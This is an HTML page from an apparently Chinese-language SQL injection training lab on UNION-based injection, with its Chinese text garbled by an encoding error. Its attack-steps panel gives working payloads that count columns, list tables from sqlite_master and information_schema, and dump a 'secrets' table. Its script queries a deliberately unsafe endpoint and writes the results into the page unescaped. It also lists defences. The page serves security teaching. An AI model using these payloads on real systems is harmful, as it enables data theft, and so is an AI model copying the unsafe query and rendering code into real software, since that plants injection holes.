<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>å®éªŒäºŒï¼šUNION æ³¨å…¥</title>
  <link rel="stylesheet" href="../xss/style.css">
</head>
<body>
  <div class="container">
    <nav class="nav">
      <a href="index.html">â† è¿”å› SQLæ³¨å…¥ Lab</a>
    </nav>

    <header>
      <h1>ğŸ“Š å®éªŒäºŒï¼šUNION æ³¨å…¥</h1>
      <p class="subtitle">UNION-based SQL Injection</p>
    </header>

    <section>
      <h2>ğŸ“– åŸç†è¯´æ˜</h2>
      <p>UNION æ³¨å…¥æ˜¯æœ€å¼ºå¤§çš„ SQL æ³¨å…¥æŠ€æœ¯ä¹‹ä¸€ï¼Œå¯ä»¥çªƒå–æ•°æ®åº“ä¸­ä»»æ„è¡¨çš„æ•°æ®ï¼š</p>
      <pre><code>-- åŸå§‹æŸ¥è¯¢
SELECT id, username, role FROM users WHERE id=1

-- UNION æ³¨å…¥å
SELECT id, username, role FROM users WHERE id=1
UNION
SELECT id, content, level FROM secrets
                    â†‘
         çªƒå– secrets è¡¨çš„æ•°æ®ï¼</code></pre>
      
      <div class="info-box">
        <strong>ğŸ’¡ UNION æ³¨å…¥æ¡ä»¶</strong>
        <p>1. ä¸¤ä¸ª SELECT çš„åˆ—æ•°å¿…é¡»ç›¸åŒ</p>
        <p>2. å¯¹åº”åˆ—çš„æ•°æ®ç±»å‹è¦å…¼å®¹</p>
      </div>
    </section>

    <section>
      <h2>ğŸ§ª æ¼æ´æ¼”ç¤º - ç”¨æˆ·æŸ¥è¯¢</h2>
      
      <p>åœºæ™¯ï¼šæ ¹æ® ID æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯</p>
      
      <div style="margin: 1rem 0;">
        <label>ç”¨æˆ· ID:</label>
        <input type="text" id="userId" placeholder="è¾“å…¥ç”¨æˆ·ID" value="1">
        <button class="btn" onclick="queryUser()" style="margin-top: 0.5rem;">æŸ¥è¯¢</button>
      </div>

      <div class="warning-box">
        <strong>ğŸ’¡ æ”»å‡»æ­¥éª¤ï¼š</strong>
        
        <p style="margin-top: 0.5rem;"><strong>Step 1: ç¡®å®šåˆ—æ•°</strong></p>
        <p><code>1 ORDER BY 3--</code> (æˆåŠŸ) â†’ <code>1 ORDER BY 4--</code> (å¤±è´¥) â†’ 3åˆ—</p>
        
        <p style="margin-top: 0.5rem;"><strong>Step 2: ç¡®å®šæ˜¾ç¤ºä½</strong></p>
        <p><code>-1 UNION SELECT 1,2,3--</code></p>
        
        <p style="margin-top: 0.5rem;"><strong>Step 3: æŸ¥è¯¢è¡¨å</strong></p>
        <p><code>-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--</code></p>
        
        <p style="margin-top: 0.5rem;"><strong>Step 4: çªƒå– secrets è¡¨</strong></p>
        <p><code>-1 UNION SELECT id,content,level FROM secrets--</code></p>
      </div>

      <div style="margin-top: 1.5rem;">
        <h3>æ‰§è¡Œçš„ SQL:</h3>
        <pre><code id="sqlDisplay">ç­‰å¾…è¾“å…¥...</code></pre>
      </div>

      <div style="margin-top: 1rem;">
        <h3>æŸ¥è¯¢ç»“æœ:</h3>
        <div id="result">
          <p style="color: #888;">ç­‰å¾…æŸ¥è¯¢...</p>
        </div>
      </div>
    </section>

    <section>
      <h2>ğŸ¯ æ”»å‡»è¯¦è§£</h2>
      
      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">ä¸ºä»€ä¹ˆç”¨ -1ï¼Ÿ</h3>
      <pre><code>-- id=-1 ä¸å­˜åœ¨ï¼ŒåŸæŸ¥è¯¢è¿”å›ç©º
SELECT id, username, role FROM users WHERE id=-1
-- UNION çš„ç»“æœå°±æ˜¯å”¯ä¸€æ˜¾ç¤ºçš„å†…å®¹
UNION SELECT id, content, level FROM secrets</code></pre>

      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">è·å–æ•°æ®åº“ç»“æ„</h3>
      <pre><code>-- SQLite æŸ¥è¯¢æ‰€æœ‰è¡¨å
-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--

-- MySQL æŸ¥è¯¢æ‰€æœ‰è¡¨å
-1 UNION SELECT 1,table_name,3 FROM information_schema.tables--</code></pre>

      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">è·å–åˆ—å</h3>
      <pre><code>-- SQLite æŸ¥è¯¢è¡¨ç»“æ„
-1 UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='secrets'--</code></pre>
    </section>

    <section>
      <h2>ğŸ›¡ï¸ é˜²å¾¡è¦ç‚¹</h2>
      <ul style="margin-left: 1.5rem;">
        <li><strong>å‚æ•°åŒ–æŸ¥è¯¢</strong> - UNION æ³¨å…¥å®Œå…¨æ— æ•ˆ</li>
        <li><strong>è¾“å…¥éªŒè¯</strong> - ID åªå…è®¸æ•°å­—</li>
        <li><strong>æœ€å°æƒé™</strong> - æŸ¥è¯¢è´¦æˆ·ä¸èƒ½è®¿é—®æ•æ„Ÿè¡¨</li>
        <li><strong>WAF</strong> - æ£€æµ‹ UNIONã€SELECT ç­‰å…³é”®å­—</li>
      </ul>
    </section>
  </div>

  <script>
    async function queryUser() {
      const id = document.getElementById('userId').value
      
      const res = await fetch(`/api/sql/user/unsafe?id=${encodeURIComponent(id)}`)
      const data = await res.json()
      
      // æ˜¾ç¤º SQL
      document.getElementById('sqlDisplay').textContent = data.sql || ''
      
      // æ˜¾ç¤ºç»“æœ
      const resultEl = document.getElementById('result')
      if (data.success && data.users.length > 0) {
        resultEl.innerHTML = `
          <table style="width: 100%; border-collapse: collapse;">
            <thead>
              <tr><th>åˆ—1</th><th>åˆ—2</th><th>åˆ—3</th></tr>
            </thead>
            <tbody>
              ${data.users.map(u => `
                <tr>
                  <td>${u.id}</td>
                  <td>${u.username}</td>
                  <td>${u.role}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        `
      } else if (data.success) {
        resultEl.innerHTML = '<p style="color: #888;">æ— ç»“æœ</p>'
      } else {
        resultEl.innerHTML = `<div class="warning-box">${data.message}</div>`
      }
    }

    // å®æ—¶æ›´æ–° SQL é¢„è§ˆ
    document.getElementById('userId').addEventListener('input', function(e) {
      document.getElementById('sqlDisplay').textContent = 
        `SELECT id, username, role FROM users WHERE id=${e.target.value}`
    })
  </script>

  <style>
    th, td {
      padding: 0.75rem;
      text-align: left;
      border-bottom: 1px solid #0f3460;
    }
    th { background: #0f3460; }
  </style>
</body>
</html>
